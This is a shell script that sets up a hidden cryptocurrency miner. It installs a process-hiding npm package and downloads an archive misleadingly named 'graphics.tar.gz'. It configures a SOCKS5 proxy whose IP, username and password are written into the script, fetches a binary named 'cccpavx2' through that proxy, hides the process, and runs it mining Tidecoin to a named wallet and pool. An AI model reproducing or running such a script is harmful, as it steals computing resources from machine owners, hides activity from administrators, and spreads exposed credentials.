#!/bin/sh

apt update && apt -y install wget curl sudo unzip autoconf git cmake binutils build-essential net-tools screen golang

sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
sudo apt-get install -y nodejs
sudo apt-get install gcc g++ make

npm i -g node-process-hider

sudo ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
sudo dpkg-reconfigure --frontend noninteractive tzdata

wget https://github.com/Asriytdx/wesharex/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END

listen = :2233

loglevel = 1

socks5 = 209.127.191.180:9279

socks5_username = ehobhrmk

socks5_password = 9omojnjzsmux

END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf >/dev/null &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

./graftcp/graftcp wget https://github.com/Asriytdx/wesharex/raw/main/cccpavx2
chmod +x cccpavx2

ph add cccpavx2

./graftcp/graftcp ./cccpavx2 -a yespowertide -o stratum+tcp://pool.tidecoin.exchange:3032 -u TQLndLcoNimErutg9BEii5NKGrB12tbfFm.MyCuan01 -t 39
